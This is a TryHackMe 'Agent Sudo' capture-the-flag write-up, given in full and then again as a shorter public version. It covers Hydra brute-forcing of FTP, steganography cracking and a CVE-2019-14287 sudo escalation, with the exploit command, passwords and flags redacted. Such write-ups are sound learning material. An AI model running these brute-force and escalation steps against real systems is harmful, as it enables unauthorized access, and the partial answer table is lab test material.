# TryHackMe - Agent Sudo Write-Up

## Room Overview

This room focused on:

* Enumeration
* HTTP Header Manipulation
* FTP Access
* Steganography
* SSH Access
* Linux Privilege Escalation
* CVE Exploitation

---

# Initial Nmap Scan

Started with a service enumeration scan.

```bash
nmap -sC -sV TARGET-IP
```

## Open Ports

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 21   | FTP     | vsftpd 3.0.3  |
| 22   | SSH     | OpenSSH 7.6p1 |
| 80   | HTTP    | Apache 2.4.29 |

---

# Web Enumeration

Visited the webpage and found the following message:

```text
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent <REDACTED>
```

This indicated that the website behavior depended on the HTTP User-Agent header.

---

# Testing User-Agent Headers

Used curl to modify the User-Agent header.

```bash
curl -A "R" http://TARGET-IP
```

The response changed and showed:

```text
What are you doing! Are you one of the 25 employees?
```

This confirmed the application was checking User-Agent values.

---

# Discovering the Correct Agent

Tested different User-Agent values.

Correct request:

```bash
curl -A "C" -L TARGET-IP
```

Received hidden message:

```text
Attention <REDACTED USER>,

Do you still remember our deal?
Please tell agent J about the stuff ASAP.
Also, change your password, is weak!

From,
Agent <REDACTED>
```

## Information Gathered

| Item             | Value           |
| ---------------- | --------------- |
| Username         | <REDACTED USER> |
| Additional Agent | J               |
| Password Hint    | Weak Password   |

---

# FTP Brute Force

Used Hydra against FTP with the discovered username.

```bash
hydra -l <REDACTED USER> -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt ftp://TARGET-IP -V
```

Successfully obtained FTP credentials.

Connected to FTP:

```bash
ftp TARGET-IP
```

---

# FTP Enumeration

Listed files:

```bash
ls
```

Files discovered:

```text
To_agentJ.txt
cute-<REDACTED PASSWORD>.jpg
cutie.png
```

Downloaded files:

```bash
get To_agentJ.txt
get cute-<REDACTED PASSWORD>.jpg
get cutie.png
```

---

# Reading Agent <REDACTED> Message

Opened the text file:

```bash
cat To_agentJ.txt
```

Contents:

```text
Dear agent J,

All these <REDACTED PASSWORD> like photos are fake! Agent <REDACTED> stored the real picture inside your directory.
Your login password is somehow stored in the fake picture.

From,
Agent <REDACTED>
```

This strongly suggested steganography.

---

# Extracting Hidden Data from PNG

Used binwalk to extract embedded files.

```bash
binwalk -e cutie.png
```

Inside the extracted directory:

```text
8702.zip
```

---

# Extracting ZIP File

Attempted extraction:

```bash
7z x 8702.zip
```

The ZIP archive required a password.

---

# Steganography on JPG

Used stegseek against the JPG image.

```bash
stegseek cute-<REDACTED PASSWORD>.jpg /usr/share/wordlists/rockyou.txt
```

Output:

```text
Found passphrase: <REDACTED PASSWORD>
```

Extracted hidden file:

```text
message.txt
```

Read the file:

```bash
cat message.txt
```

Contents:

```text
Hi <REDACTED USER>,

Glad you find this message. Your login password is <REDACTED PASSWORD>

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
<REDACTED USER>
```

# SSH Access--

Connected through SSH:

```bash
ssh <USER>@TARGET-IP
```

Password:

```text
<REDACTED PASSWORD>
```

---

# User Flag

Listed files:

```bash
ls -al
```

Discovered:

```text
user_flag.txt
```

Read the flag:

```bash
cat user_flag.txt
```

---

# Privilege Escalation Enumeration

Checked sudo permissions:

```bash
sudo -l
```

Output:

```text
(ALL, !root) /bin/bash
```

This sudo configuration is vulnerable to:

```text
CVE-2019-14287 (Publicly Known Sudo Vulnerability)
```

---

# Privilege Escalation

Used the sudo UID bypass exploit:

```bash
<REDACTED PRIVILEGE ESCALATION COMMAND>
```

Verified root access:

```bash
whoami
```

Output:

```text
root
```

---

# Root Flag

Read the root flag:

```bash
cat /root/root.txt
```

---

# Key Concepts Learned

* Nmap Enumeration
* FTP Enumeration
* Gobuster
* HTTP User-Agent Manipulation
* Hydra Password Attacks
* FTP File Transfers
* Binwalk Extraction
* Steganography
* Stegseek
* SSH Access
* Linux Enumeration
* Sudo Misconfiguration
* CVE-2019-14287 Privilege Escalation

---

# Important Commands

## Nmap

```bash
nmap -sC -sV TARGET
```

## Gobuster

```bash
gobuster dir -u http://TARGET -w WORDLIST
```

## Curl User-Agent

```bash
curl -A "<REDACTED>" TARGET
```

## Hydra

```bash
hydra -l USER -P WORDLIST ftp://TARGET
```

## FTP

```bash
ftp TARGET
```

## Binwalk

```bash
binwalk -e FILE
```

## Stegseek

```bash
stegseek IMAGE.jpg rockyou.txt
```

## SSH

```bash
ssh USER@TARGET
```

## Sudo Enumeration

```bash
sudo -l
```

## Privilege Escalation

```bash
<REDACTED PRIVILEGE ESCALATION COMMAND>
```

---

# Public GitHub / LinkedIn Safe Version

Use this version publicly if you do not want to leak spoilers or sensitive information.

---

# TryHackMe - Agent Sudo Write-Up

## Room Overview

This room focused on:

* Enumeration
* HTTP Header Manipulation
* FTP Access
* Steganography
* SSH Access
* Linux Privilege Escalation

---

# Initial Enumeration

Started with an Nmap scan to identify open services.

```bash
nmap -sC -sV TARGET-IP
```

## Open Ports

| Port | Service |
| ---- | ------- |
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |

---

# Web Enumeration

The webpage contained a clue related to modifying the HTTP User-Agent header.

Used curl to test different User-Agent values:

```bash
curl -A "<REDACTED>" TARGET-IP
```

This revealed a hidden message and helped identify a valid username.

---

# FTP Access

Used Hydra with a smaller password wordlist to brute force FTP credentials.

```bash
hydra -l <REDACTED> -P WORDLIST ftp://TARGET-IP
```

Successfully obtained FTP access.

---

# FTP Enumeration

Discovered multiple files including:

* text notes
* image files
* hidden embedded data

Downloaded the files locally for further analysis.

---

# Steganography & File Analysis

Used:

* binwalk
* strings
* stegseek
* 7z

To identify hidden data inside image files.

```bash
binwalk -e IMAGE.png
```

```bash
stegseek IMAGE.jpg rockyou.txt
```

Recovered:

* hidden messages
* additional credentials
* password clues

---

# SSH Access

Used discovered credentials to access the machine through SSH.

```bash
ssh USER@TARGET-IP
```

---

# Privilege Escalation

Enumerated sudo permissions:

```bash
sudo -l
```

Identified a vulnerable sudo configuration related to:

```text
CVE-2019-14287
```

Escalated privileges successfully and obtained root access.

---

# Skills Practiced

* Nmap Enumeration
* Gobuster
* Hydra
* FTP Enumeration
* Linux Commands
* Steganography
* SSH Access
* Privilege Escalation
* CVE Research

---

# Notes

Sensitive information including:

* passwords
* flags
* exact credentials
* target IPs
* exploit details

have been intentionally redacted.

---

# Final Answers

| Question                                        | Answer                              |
| ----------------------------------------------- | ----------------------------------- |
| How did you redirect yourself to a secret page? | User-Agent                          |
| ZIP Password                                    | <REDACTED>                          |
| Steg Password                                   | <REDACTED>                          |
| Incident Name                                   | Roswell <REDACTED PASSWORD> autopsy |
| Privilege Escalation CVE                        | CVE-2019-14287                      |
| Who is Agent <REDACTED>?                        | <REDACTED>                          |

